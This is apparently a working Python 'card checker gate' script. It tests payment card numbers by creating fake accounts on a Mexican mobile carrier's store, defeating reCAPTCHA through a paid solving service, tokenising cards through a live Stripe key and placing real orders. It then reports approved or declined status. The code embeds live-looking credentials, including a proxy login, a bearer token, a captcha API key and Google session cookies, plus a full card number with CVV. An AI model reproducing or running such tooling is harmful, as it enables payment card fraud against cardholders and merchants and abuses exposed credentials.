from tarfile import data_filter
import random, time
from faker import Faker
from random import choice
from tkinter import Tk, filedialog
from httpx import request
import requests,re
from bs4 import BeautifulSoup as b
from bs4 import BeautifulSoup
#from hh import keep_alive
import requests
import json, string, re
import requests
import time
import json
import random, time
from faker import Faker
from random import choice
import asyncio
import requests
from bs4 import BeautifulSoup
import requests
import re
from bs4 import BeautifulSoup as b
from curl_cffi import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import json
import cloudscraper


def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None

def get_random_proxy(file_path="proxys.txt"):
    with open(file_path, "r") as f:
        proxies = f.readlines()
    
    proxy = random.choice(proxies).strip()  # Elegir un proxy aleatorio
    host_port, user_pass = proxy.split("@")  # Separar IP y usuario:contraseña
    host, port = host_port.split(":")  # Separar IP y puerto
    user, password = user_pass.split(":")  # Separar usuario y contraseña
    
    return host, port, user, password
async def resolver_captcha(api_key, sitekey, url):
    data = {
        'clientKey': api_key,
        'task': {
            'type': 'NoCaptchaTaskProxyless',
            'websiteURL': url,
            'websiteKey': sitekey
        }
    }
    try:
        response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/createTask', json=data)
        result = response.json()

        if 'errorId' in result and result['errorId'] == 0:
            task_id = result['taskId']
            
            # Esperar a que se resuelva el captcha
            while True:
                await asyncio.sleep(5)
                response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/getTaskResult', json={'clientKey': api_key, 'taskId': task_id})
                if response.json()['status'] == 'ready':
                    return response.json()['solution']['gRecaptchaResponse']
        else:
            raise Exception('Error en la API de anti-captcha')

    except Exception as e:
        raise Exception(f'Error al resolver el captcha: {str(e)}')
def ccn_gate(card):
    max_retries = 15
    retry_count = 0
    while retry_count < max_retries:
        try:
            #============[Funcions Need]============#
            c =  requests.Session()
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 2: ano_number = "20"+ano_number
            agente_user = UserAgent()
            proxy_host, proxy_port, proxy_user, proxy_pass = get_random_proxy()
            proxy = "geo.iproyal.com:12321"  # SIN "http://"
            proxy_auth = "rTPt8eauWJNOjdno:BUo3nBhOfK3TV3vt_country-us"

            proxys={"server": f"http://{proxy_host}:{proxy_port}"}

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            email = usuario()['email']
            number = random.randint(1111, 9999)
            street = f"{name} street {number}"
            phone = usuario()['phone']

            #============[Requests 1]============#

            correos = [
                "marilisaqnituk@gmail.com",
                "flortsquitk@gmail.com",
                "quitukferchag@gmail.com",
                "saramanquitk@gmail.com",
                "jorgaioquint@gmail.com",
                "rodrigoking234@gmail.com",
                "rodrigoquituk004@gmail.com",
                "armeida.cate771@gmail.com",
                "viquitukeliander@gmail.com",
                "quityksantome@gmail.com",
                "samanquitguajal@gmail.com",
                "quintkdelgelo@gmail.com",
                "squitukjomilu@gmail.com",
                "lauranquinyuk@gmail.com",
                "rodrigoqgomez@gmail.com",
                "gardunoerick2@gmail.com"
            ]

            correo_seleccionado = random.choice(correos)
            headers = {
                'authority': 'redphone.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'origin': 'https://ecommerce.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://ecommerce.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }
            params = {
                'imei': '353495111910597',
                'sim_card_type': 'embedded',
            }

            response =  c.get('https://redphone.api.koonolmexico.com/altan/imei_check', params=params, headers=headers)
            

            headers = {
                'authority': 'redphone.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiI2YTkzYjYxNC1lYzE4LTRlMDYtOWY4ZC1kZjhhYTY2NjllOWIifQ.ztwNlAv-V8L0M6qHfB68Q_cXupibSQCFTEguIf6XxTo',
                'cache-control': 'no-cache',
                'origin': 'https://ecommerce.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://ecommerce.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                'bundle_id': '24',
            }

            response = c.get('https://redphone.api.koonolmexico.com/sim_cards/sim_cards', params=params, headers=headers)
            
            headers = {
                'authority': 'redphone.api.koonolmexico.com',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json; charset=UTF-8',
                'origin': 'https://ecommerce.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://ecommerce.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            json_data = {
                'user': {
                    'signup_status': 'authorized',
                    'name': 'julie',
                    'last_name': 'villa',
                    'maiden_name': '',
                    'email': correo_seleccionado,
                    'phone': None,
                    'mobile_phone': '9986363268',
                    'privacy_acceptance': True,
                },
            }


            response = c.post('https://redphone.api.koonolmexico.com/users', headers=headers, json=json_data)
            responsePm = json.loads(response.text)
            id_servicio = responsePm['user']['id']
            print(id_servicio)
            

            API_KEY = "cac59a01c519254119599acd1084d7c4"  # 🔴 Reemplázala con tu clave de Anti-Captcha
            SITE_KEY = "6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll"  # 🔹 Sitekey de reCAPTCHA
            URL_OBJETIVO = "https://ecommerce.redphone.com.mx/paso-3"  # 🔹 Página con el reCAPTCHA

            # 1. Enviar solicitud a Anti-Captcha para resolver el reCAPTCHA
            response = requests.post("https://api.anti-captcha.com/createTask", json={
                "clientKey": API_KEY,
                "task": {
                    "type": "RecaptchaV2TaskProxyless",  # Método para reCAPTCHA V2 (invisible)
                    "websiteURL": URL_OBJETIVO,
                    "websiteKey": SITE_KEY
                }
            })

            result = response.json()
            if result.get("errorId") != 0:
                print(f"❌ Error al enviar captcha: {result}")
                exit()

            task_id = result["taskId"]
            print(f"✅ Captcha enviado. ID: {task_id}")

            # 2. Esperar que Anti-Captcha resuelva el captcha
            for _ in range(15):  # Máximo 75 segundos (15 intentos de 5 seg)
                time.sleep(5)
                respuesta = requests.post("https://api.anti-captcha.com/getTaskResult", json={
                    "clientKey": API_KEY,
                    "taskId": task_id
                })

                resultado = respuesta.json()
                
                if resultado.get("status") == "ready":
                    token_captcha = resultado["solution"]["gRecaptchaResponse"]
                    print(f"✅ Captcha resuelto: ")
                    break
                print("⏳ Esperando resolución...")

            headers = {
                'authority': 'www.google.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/x-protobuffer',
                # 'cookie': '__Secure-3PAPISID=RpxSH8Er4vu9_-vw/A7hRrCp8qg6w0Hp6l; __Secure-3PSID=g.a000wwgaJQGIFqZyyZ8fiYmGtaN-k0ywdqQhPz_9vwPsa4s_tw3Oc9XEjsQVK6NIa5l6YdgJ4wACgYKAZsSARYSFQHGX2MiKRq0RsOj3dPcqPHWgWk39RoVAUF8yKqEi0gbPnBaTpKE02yaXaV-0076; NID=524=Bjlha-sk9zOfyKYFQKjno-xfvBZXJ8vsIklFc_toQsQivbdhQTMIiBag-ZBU6OXtme1LHcVIIlN1iOdxRA3Otw5TVrVwMPrggCO2yRd0zQhXkyYVyxgJTR57lfaWbzR_5ZWHiXAhyfK60KZrU5O5ZIb24kIv3nZaROUXjb3Pyzl7ebpi5DbJx4ITdMUIjQ3I6NhZcbhIQ0Y4EGH5ikfX1bqpxYFls5p979Wzdy8iYU8rxP8o7GgQMPcqw40ZbQyKeAydcZVqSnyHVgIc4R7xPJ7Ke75U7PThkAHHxkZ0hFhPnkn1ZoUxKAv6j0d7n75vqfANsJPQyAoFbybBbuxGAfYtwgFNLwgvYY1VLuPdfazxh57c6g1XC4DGYaO-tc23SZ5rvxZKgNAR8ltkCaeKo1jn4GX5sg9kKca4ypJqfX31HvO-Yi3eRCBew5b1CbsvoJ7ZxC1kRTTYUy3s8CAmInCzyXFWOoSGzaWiXlRUwV9Q54_zku_1HxFcemntPALpQzBVMWlsBQXEt1KUlsKzrwzY1WSw8IVkn8SYk1rJUhfZ2IEuKTXMO6MdA4_5FAE9XokKXjMVGfK4TYTzUVwzq_c_F1Xr1KNWpbEz1rK0HO3n0_JCcRBaas4gecWDE2oLr5tdloh8Bl9ovujSNTEDpjZGzKjZbm6-SUyPzJpDZIgANafNfh6VtSwE16T1V1B0I3Ka-h8H-sw0GNWsrqHzA-Jp35tEiZdP-BpfSuW6rXrMLS189twi2Pt5qFZWJ1Lmk83FnrctLjTNf8quGlvoZg2FhI2w6SIV18T29I5gNnYUW2x6q7UlYtMFf2mS-4Uk1JI8FfQFcZhcydVjpwoz8z9yYJhi66Xhw0e6UzODedo0UjvRrlkVI7DZAbfi197ruUKfxJQr6jwGsELbaWVpROhd7FE2iZmI_ufkhNJC_0bfPl1bweUCilvQD18jHoXbn02Qy02FdEijD25KjAoQqt8PjAzKzEsGum5pTyRYJO8FJc6vkn0AbE7qFj08tt_tkKAYPn7NcmAzAJb1wvDSxasuiTPPXm4KZpgy2c4cYWPXYjmpgtFRb7G_FPB_fDQcuf48SvC4rtGg9ZA9wDbR_h73p9xQTOAom0ZDLhul5ySvf-RrydZyjdp5fc9yytWWu8ZjHrWxlyzZd-LGV4V8NMyilWxW-pxKeqR8-OiQWz8pDb2JmLz85bwZTzk_WNF2UI8rNFtg_ysXNGYTZevOAeFQmlxvvUKpWPE1A5EB5zue2ySKNM-tzssFKnj7EW1Z-u6aOL_KjFzJ5tC8FSgwTXTCKO69Muh4J6ksrq7fUaxQIYNUcAO1DgLNnYNi1uEM2ttp9t53MizmJo4do8iayOZOKmUcMokG64IHIIvdmNhR1cdHvcLQ7YY01NIwSAudsieHwUW-xmmm69KSqGqWjwGi7s9Nv8xxud6t3A; __Secure-3PSIDTS=sidts-CjIB5H03P9FbtGATpvevBoYjOer4Nwuh7gM16VOOPIGcN4eVIA-ciUzANjEIrq4vNE0aBRAA; __Secure-3PSIDCC=AKEyXzVNjKl4-4tE-yh4SZf4KjpxMAezobvXYkTI1ZlYmYJaFbrYc3mhcjKb-w1ZZexPnhtv4c0',
                'origin': 'https://www.google.com',
                'pragma': 'no-cache',
                'referer': 'https://www.google.com/recaptcha/api2/bframe?hl=es&v=GUGrl5YkSwpBsxsF3eY665Ye&k=6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'x-client-data': 'CLuIywE=',
            }

            params = {
                'k': '6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll',
            }

            data = b'\n\x18GUGrl5YkSwqiWrzO3ShIKDlu\x12\xc3\xa4\x0b' + token_captcha.encode('utf-8')

            response = c.post('https://www.google.com/recaptcha/api2/reload', params=params, headers=headers, data=data)

            headers = {
                'authority': 'www.google.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                # 'cookie': '__Secure-3PAPISID=RpxSH8Er4vu9_-vw/A7hRrCp8qg6w0Hp6l; __Secure-3PSID=g.a000wwgaJQGIFqZyyZ8fiYmGtaN-k0ywdqQhPz_9vwPsa4s_tw3Oc9XEjsQVK6NIa5l6YdgJ4wACgYKAZsSARYSFQHGX2MiKRq0RsOj3dPcqPHWgWk39RoVAUF8yKqEi0gbPnBaTpKE02yaXaV-0076; NID=524=Bjlha-sk9zOfyKYFQKjno-xfvBZXJ8vsIklFc_toQsQivbdhQTMIiBag-ZBU6OXtme1LHcVIIlN1iOdxRA3Otw5TVrVwMPrggCO2yRd0zQhXkyYVyxgJTR57lfaWbzR_5ZWHiXAhyfK60KZrU5O5ZIb24kIv3nZaROUXjb3Pyzl7ebpi5DbJx4ITdMUIjQ3I6NhZcbhIQ0Y4EGH5ikfX1bqpxYFls5p979Wzdy8iYU8rxP8o7GgQMPcqw40ZbQyKeAydcZVqSnyHVgIc4R7xPJ7Ke75U7PThkAHHxkZ0hFhPnkn1ZoUxKAv6j0d7n75vqfANsJPQyAoFbybBbuxGAfYtwgFNLwgvYY1VLuPdfazxh57c6g1XC4DGYaO-tc23SZ5rvxZKgNAR8ltkCaeKo1jn4GX5sg9kKca4ypJqfX31HvO-Yi3eRCBew5b1CbsvoJ7ZxC1kRTTYUy3s8CAmInCzyXFWOoSGzaWiXlRUwV9Q54_zku_1HxFcemntPALpQzBVMWlsBQXEt1KUlsKzrwzY1WSw8IVkn8SYk1rJUhfZ2IEuKTXMO6MdA4_5FAE9XokKXjMVGfK4TYTzUVwzq_c_F1Xr1KNWpbEz1rK0HO3n0_JCcRBaas4gecWDE2oLr5tdloh8Bl9ovujSNTEDpjZGzKjZbm6-SUyPzJpDZIgANafNfh6VtSwE16T1V1B0I3Ka-h8H-sw0GNWsrqHzA-Jp35tEiZdP-BpfSuW6rXrMLS189twi2Pt5qFZWJ1Lmk83FnrctLjTNf8quGlvoZg2FhI2w6SIV18T29I5gNnYUW2x6q7UlYtMFf2mS-4Uk1JI8FfQFcZhcydVjpwoz8z9yYJhi66Xhw0e6UzODedo0UjvRrlkVI7DZAbfi197ruUKfxJQr6jwGsELbaWVpROhd7FE2iZmI_ufkhNJC_0bfPl1bweUCilvQD18jHoXbn02Qy02FdEijD25KjAoQqt8PjAzKzEsGum5pTyRYJO8FJc6vkn0AbE7qFj08tt_tkKAYPn7NcmAzAJb1wvDSxasuiTPPXm4KZpgy2c4cYWPXYjmpgtFRb7G_FPB_fDQcuf48SvC4rtGg9ZA9wDbR_h73p9xQTOAom0ZDLhul5ySvf-RrydZyjdp5fc9yytWWu8ZjHrWxlyzZd-LGV4V8NMyilWxW-pxKeqR8-OiQWz8pDb2JmLz85bwZTzk_WNF2UI8rNFtg_ysXNGYTZevOAeFQmlxvvUKpWPE1A5EB5zue2ySKNM-tzssFKnj7EW1Z-u6aOL_KjFzJ5tC8FSgwTXTCKO69Muh4J6ksrq7fUaxQIYNUcAO1DgLNnYNi1uEM2ttp9t53MizmJo4do8iayOZOKmUcMokG64IHIIvdmNhR1cdHvcLQ7YY01NIwSAudsieHwUW-xmmm69KSqGqWjwGi7s9Nv8xxud6t3A; __Secure-3PSIDTS=sidts-CjIB5H03P9FbtGATpvevBoYjOer4Nwuh7gM16VOOPIGcN4eVIA-ciUzANjEIrq4vNE0aBRAA; __Secure-3PSIDCC=AKEyXzXbiG2HGGsZq36fEp7D7EQ_yfCQyn4--NK_Tjgd51F3VHp6X-gtcrvLHMnyf3Qdk5DokAc',
                'origin': 'https://www.google.com',
                'pragma': 'no-cache',
                'referer': 'https://www.google.com/recaptcha/api2/bframe?hl=es&v=GUGrl5YkSwpBsxsF3eY665Ye&k=6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'x-client-data': 'CLuIywE=',
            }

            params = {
                'k': '6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll',
            }

            data = f'v=GUGrl5YkSwpBsxsF3eY665Ye&c={token_captcha}'
 
            response = c.post(
                'https://www.google.com/recaptcha/api2/userverify',
                params=params,
                headers=headers,
                data=data,
            )

            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'en-US',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'pragma': 'no-cache',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            data = f'time_on_page=19320&pasted_fields=number&guid=2953e2d9-6a1c-4c42-a83e-28bb4e237f8577fee5&muid=830cfac5-04bc-45bf-b039-3d4790e48dfa5b7899&sid=66066ccb-0350-46f6-9b05-4b10333d40fac9bfbf&key=pk_live_51KOX42AMlS3RZFNSs08ALhGLqQIZ8hZLlEkBxYlxQo6aJlEcz442oQ7L9Eejs7niMHf6PKYGofk0jIMB78ubKt6D00qp0QZjLC&payment_user_agent=stripe.js%2F78ef418&card[number]={cc_number}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano_number}'

            response = c.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
            responsePm = json.loads(response.text)
            tokenst = responsePm['id']
            print(tokenst)

            headers = {
                'authority': 'redphone.api.koonolmexico.com',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json; charset=UTF-8',
                'origin': 'https://ecommerce.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://ecommerce.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            json_data = {
                'payment_card': {
                    'openpay_token': None,
                    'openpay_device_session_id': 'XnW6OQ5H4436jIR14GCUgoj0XjtvVId2',
                    'stripe_token': tokenst,
                    'is_default': True,
                    'payment_method': 'card',
                    'identification_number': None,
                    'mercado_pago_token': None,
                },
                'user_id': id_servicio,
            }

            response = c.post('https://redphone.api.koonolmexico.com/payment_cards', headers=headers, json=json_data)

            headers = {
                'authority': 'redphone.api.koonolmexico.com',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json; charset=UTF-8',
                'origin': 'https://ecommerce.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://ecommerce.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            json_data = {
                'altan_service_bundle_order': {
                    'user_id': id_servicio,
                    'payment_method': 'card',
                    'concept': 'bundle',
                    'latitude': 20.5964312,
                    'longitude': -100.388084,
                    'recurring_payments': False,
                    'payment_plan': None,
                    'nir': None,
                    'code': None,
                    'admin_id': None,
                    'promoter_code': None,
                    'dpcard_number': None,
                    'activation_code_qr_file_url': None,
                    'bundle_id': '24',
                },
                'user_id': id_servicio,
            }

            response = c.post('https://redphone.api.koonolmexico.com/altan_service_bundle_orders', headers=headers, json=json_data)
            data = json.loads(response.text)
            print(responsePm)
            try:
                # Si es un error (Stripe - tarjeta declinada u otro)
                if 'message' in data and 'error' in data['message']:
                    error_info = data['message']['error']
                    decline_code = error_info.get('decline_code', 'desconocido')
                    message = error_info.get('message', 'Error desconocido')
                    return f"""❌ *Tarjeta Declinada*
            *Motivo:* {message}
            *Decline Code:* `{decline_code}`"""

                # Si es una respuesta de compra exitosa (altan_service_bundle_order entregado)
                elif 'altan_service_bundle_order' in data:
                    orden = data['altan_service_bundle_order']
                    status = orden.get('status')
                    if status == 'delivered':
                        return f"""✅ *Compra Aprobada*
            *Estado:* `{status}`"""
                    else:
                        return f"""⚠️ *Compra No Completada*
            *Estado:* `{status}`"""

                # Caso desconocido
                return """❓ *Respuesta desconocida*
            No se pudo interpretar el resultado de la operación."""

            except Exception as e:
                return f"""⚠️ *Error al procesar*
            Detalles: `{str(e)}`"""


            

        
            
        except Exception as e:
            print(e)
            retry_count += 1
    else:
        return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}
    

if __name__ == "__main__":
    print(ccn_gate("4268070338854484|07|2026|151"))